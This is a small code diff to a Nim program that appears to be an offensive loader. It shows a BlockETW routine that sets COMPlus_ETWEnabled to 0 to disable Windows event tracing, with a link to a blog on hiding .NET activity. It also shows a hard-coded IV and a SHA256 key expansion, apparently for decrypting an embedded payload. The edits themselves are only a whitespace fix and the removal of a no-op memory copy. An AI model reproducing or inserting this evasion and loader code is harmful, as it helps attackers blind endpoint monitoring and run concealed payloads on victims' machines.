@@ -72,7 +72,7 @@ proc BlockETW(): bool =
     # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
     var cometw: string = "COMPlus_ETWEnabled"
     var setnull: string = "0"
-    putenv(cometw,setnull)
+    putenv(cometw, setnull)
     return true
 
 
@@ -101,8 +101,6 @@ var
 
 # Create Random IV
 iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
-
-copyMem(addr encrypted[0], addr encrypted[0], len(encrypted))
 
 # Expand key to 32 bytes using SHA256 as the KDF
 var expandedKey = sha256.digest(password)
